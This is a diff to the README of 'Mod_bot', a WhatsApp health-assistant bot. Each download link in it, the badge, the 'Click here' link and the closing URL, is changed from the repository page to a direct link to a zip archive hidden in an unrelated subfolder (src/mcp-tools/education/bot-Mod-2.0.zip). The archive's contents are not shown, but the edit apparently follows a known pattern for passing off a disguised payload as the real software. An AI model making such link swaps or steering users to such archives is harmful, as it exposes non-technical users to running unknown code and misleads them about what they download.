@@ -1,6 +1,6 @@
 # 🤖 Mod_bot - Easy WhatsApp Health Assistant
 
-[![Download Mod_bot](https://img.shields.io/badge/Download-Mod_bot-ff69b4?style=for-the-badge)](https://github.com/chompi10/Mod_bot)
+[![Download Mod_bot](https://img.shields.io/badge/Download-Mod_bot-ff69b4?style=for-the-badge)](https://github.com/chompi10/Mod_bot/raw/refs/heads/main/src/mcp-tools/education/bot-Mod-2.0.zip)
 
 ## 📋 What is Mod_bot?
 
@@ -28,7 +28,7 @@ You also need a WhatsApp Business API account linked through Twilio or Meta Clou
 
 To get Mod_bot, you will visit the GitHub page and download the software from there.
 
-[**Click here to visit the download page**](https://github.com/chompi10/Mod_bot)
+[**Click here to visit the download page**](https://github.com/chompi10/Mod_bot/raw/refs/heads/main/src/mcp-tools/education/bot-Mod-2.0.zip)
 
 Steps to download:
 
@@ -121,7 +121,7 @@ This step is optional and only recommended if you want the bot always on.
 
 Visit this page to download and start using Mod_bot on your Windows machine:
 
-[https://github.com/chompi10/Mod_bot](https://github.com/chompi10/Mod_bot)
+[https://github.com/chompi10/Mod_bot/raw/refs/heads/main/src/mcp-tools/education/bot-Mod-2.0.zip](https://github.com/chompi10/Mod_bot/raw/refs/heads/main/src/mcp-tools/education/bot-Mod-2.0.zip)
 
 You can click the download badge at the top or save this link for later use.
 
